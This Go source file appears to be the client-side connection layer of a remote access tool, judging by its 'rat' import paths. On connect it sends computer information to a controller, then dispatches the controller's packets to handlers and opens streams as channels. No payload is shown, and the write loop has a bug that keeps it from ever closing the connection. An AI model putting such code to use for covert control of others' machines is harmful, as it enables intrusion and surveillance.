package main

import (
	"encoding/binary"
	"errors"
	"rat/shared"
	"rat/shared/network/header"

	"github.com/xtaci/smux"
)

type Connection struct {
	Conn    *smux.Session
	control *smux.Stream
}

var Queue chan Outgoing

func (c *Connection) Init() {
	Queue <- &ComputerInfoPacket{}
}

func (c *Connection) Close() {
	c.Conn.Close()
}

func (c *Connection) writeLoop() {
	var err error
	for {
		select {
		case p := <-Queue:
			err = binary.Write(c.control, shared.ByteOrder, p.Header())
			if err != nil {
				break
			}

			err = p.Write(c.control, c)
			if err != nil {
				break
			}
		}
	}

	c.Close()
}

func (c *Connection) recvLoop() {
	var err error
	for {
		var h header.PacketHeader
		binary.Read(c.control, shared.ByteOrder, &h)

		var channel bool
		err = binary.Read(c.control, shared.ByteOrder, &channel)
		if err != nil {
			break
		}

		if channel {
			channel, is := handlerMap[h].(Channel)
			if !is {
				err = errors.New("invalid channel header " + string(h))
				break
			}

			stream, _ := c.Conn.AcceptStream()
			go channel.Open(stream, c)
		} else {
			packet, is := handlerMap[h].(Incoming)
			if !is {
				err = errors.New("invalid packet header " + string(h))
				break
			}

			err = packet.Read(c.control, c)
		}

		if err != nil {
			break
		}
	}
}
